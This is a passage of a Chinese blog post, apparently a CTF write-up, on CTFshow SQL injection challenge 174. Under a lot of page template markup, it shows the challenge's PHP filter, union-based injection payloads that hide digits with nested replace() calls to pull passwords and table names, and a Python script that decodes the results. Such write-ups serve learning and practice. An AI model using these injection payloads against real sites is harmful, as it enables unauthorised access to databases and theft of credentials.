<!DOCTYPE html>
<html lang="zh-CN">

    
        <script src="/js/custom/love.min.js"></script>
    


<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Ko1sh1">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2021/12/24/blog_ctfshow_sql注入/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="CTFshow SQL注入解题记录">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFshow SQL注入解题记录">
<meta property="og:url" content="http://example.com/2021/12/24/blog_ctfshow_sql%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="CTFshow SQL注入解题记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/blog/image-20220814155354104.png">
<meta property="og:image" content="http://example.com/images/blog/image-20220814160116958.png">
<meta property="og:image" content="http://example.com/images/blog/image-20220814160521291.png">
<meta property="og:image" content="http://example.com/images/blog/image-20220814175822042.png">
<meta property="og:image" content="http://example.com/images/blog/image-20220814180235512.png">
<meta property="og:image" content="http://example.com/images/blog/image-20220814180713927.png">
<meta property="og:image" content="http://example.com/images/blog/image-20220814180755995.png">
<meta property="og:image" content="http://example.com/images/blog/image-20220814181217820.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\2087645-20210825152638568-614907953.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220818164530076.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220818171119466.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220825112735610.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220825113203126.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220825113630972.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220825121029602.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220825121135839.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220825210418038.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220825213515610.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220825214137210.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220820170331410.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220820172654426.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220820181216652.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220821202454491.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220821203531154.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220821210207735.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220821210837336.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220822170714632.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220822172818156.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\2087645-20210825152632083-741400030.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220822202801278.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220823150042653.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220823211612559.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220823215511074.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220824210812216.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220824210909564.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220824211200023.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220827174004598.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220827203644095.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220828162105726.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220828162153542.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220828162245348.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\2087645-20211009153227244-347079002.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\2087645-20211009153226629-1446255486.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\2087645-20211009153226087-633437425.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220829215555881.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220829220855299.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220830095349947.png">
<meta property="og:image" content="r:\languages\websafe\DataCon%E5%AD%A6%E4%B9%A0\day3_sql%E6%B3%A8%E5%85%A5\pic\image-20220830095414807.png">
<meta property="article:published_time" content="2021-12-24T01:55:59.000Z">
<meta property="article:modified_time" content="2024-05-30T13:58:30.513Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/blog/image-20220814155354104.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/avatar.jpg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
    <meta name="theme-color" content="#FFA07A">
    <link rel="shortcut icon" href="/images/avatar.jpg">
    <!--- Page Info-->
    
    <title>
        
            CTFshow SQL注入解题记录 -
        
        Ko1sh1&#39;s Blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    
        
            
    
            
    
            
                
                    <style> .home-banner-container .content div:nth-child(2) { justify-content: center !important;  } .home-banner-container .content div:nth-child(2) div:first-child { display: none !important; } </style>
                
    
            
                
                    <script data-swup-reload-script src='/js/custom/jquery.min.js'></script>
                
    
            
                
                    <script data-swup-reload-script src='/js/custom/text.js'></script>
                
    
            
                
                    <link rel='stylesheet' href='/css/mouse.css'>
                
    

    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    <!--- Font Part-->
    
        <link href="/fonts/fonts.css" rel="stylesheet">
    
    
    
        <link href="/fonts/fonts.css" rel="stylesheet">
    
    
        <link href="/fonts/fonts.css" rel="stylesheet">
    


    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFA07A","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"english":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":false,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/b.jpg","dark":"/images/b.jpg"},"title":"Ko1sh1's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#FF7569","dark":"#FF7569"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ko1sh1","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null,"qq":"/images/qq.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"雨に濡れた空気","artist":"春野杉卉","url":"/musics/雨に濡れた空気.mp3","cover":"/images/雨に濡れた空気.jpg"},{"name":"悋気","artist":"iwamizu","url":"/musics/悋気.mp3","cover":"/images/悋気.jpg"},{"name":"天空之城","artist":"StudioEIM","url":"/musics/天空之城.mp3","cover":"/images/天空之城.jpg"},{"name":"星茶会","artist":"灰澈","url":"/musics/星茶会.mp3","cover":"/images/星茶会.jpg"},{"name":"Talking to the Moon","artist":"MT1990","url":"/musics/Talking to the Moon.mp3","cover":"/images/Talking to the Moon.jpg"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":true,"color":{"left":"#87CEEB","right":"#FFB6C1","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Photos":{"path":"/masonry","icon":"fa-regular fa-image"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/2/5 17:00:00"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.1.1"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



    
        <script src="/js/custom/love.min.js"></script>
    


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">

    <div class="navbar-content ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Ko1sh1&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    归档
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories"
                                        >
                                    <i class="fa-regular fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    关于
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a href="/about">
                                                    ME
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a href="/links/">
                                                    师傅们
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                归档
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-About"
                        >
                            <span>
                                关于
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/about">ME</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/links/">师傅们</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/tags"
                        >
                            <span>Tags</span>
                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/masonry"
                        >
                            <span>Photos</span>
                            <i class="fa-regular fa-image fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    
    
        <script src="/js/custom/love.min.js"></script>
    


<div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                
                
                <img src="/images/blog10.jpg" alt="CTFshow SQL注入解题记录" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
                
                <div class="w-full flex items-center absolute bottom-0 justify-start">
                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">CTFshow SQL注入解题记录</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/avatar.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Ko1sh1</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2021-12-24 09:55:59</span>
        <span class="mobile">2021-12-24 09:55:59</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-05-30 21:58:30</span>
            <span class="mobile">2024-05-30 21:58:30</span>
            <span class="hover-info">更新</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/sql/">sql</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>24.7k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>119 分钟</span>
        </span>
    
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h1><h2 id="174（限制数字-replace）"><a href="#174（限制数字-replace）" class="headerlink" title="174（限制数字-replace）"></a>174（限制数字-replace）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里限制了flag字眼和数字，所以我们需要将数字全部替换掉(本题没有flag字段，不用更换flag，否则还需要根据所在位置进行相应处理)</p>
<h3 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h3><p><strong>方法：将数据to_base64加密，然后将里面所有的数字用replace()替换</strong>（本题会将数字替换掉，且测试order有两行，所以这里select写的’a’,replace()这种。其他题用的话复制粘贴注意一下)</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>koishia<span class="string">&#x27;),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>koishib<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>koishic<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>koishid<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>koishie<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>koishif<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>koishig<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>koishih<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>koishii<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>koishij<span class="string">&#x27;) from ctfshow_user4 --+</span></span><br></pre></td></tr></table></figure></div>



<p>然后写个简单的py脚本换回来就行,字符串不长，自己手动换也行 &#x3D;。&#x3D;</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">a= a.replace(<span class="string">&#x27;koishia&#x27;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishib&#x27;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishic&#x27;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishid&#x27;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishie&#x27;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishif&#x27;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishig&#x27;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishih&#x27;</span>,<span class="string">&quot;7&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishii&#x27;</span>,<span class="string">&quot;8&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishij&#x27;</span>,<span class="string">&quot;9&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure></div>



<h3 id="具体题解步骤"><a href="#具体题解步骤" class="headerlink" title="具体题解步骤"></a>具体题解步骤</h3><ul>
<li><strong>查看列数</strong></li>
</ul>
<p>用order一个一个试</p>
<ul>
<li><strong>数据库</strong></li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,database()--+</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814155354104.png"
                      alt="image-20220814155354104"
                ></p>
<ul>
<li><strong>数据表</strong></li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>koishia<span class="string">&#x27;),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>koishib<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>koishic<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>koishid<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>koishie<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>koishif<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>koishig<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>koishih<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>koishii<span 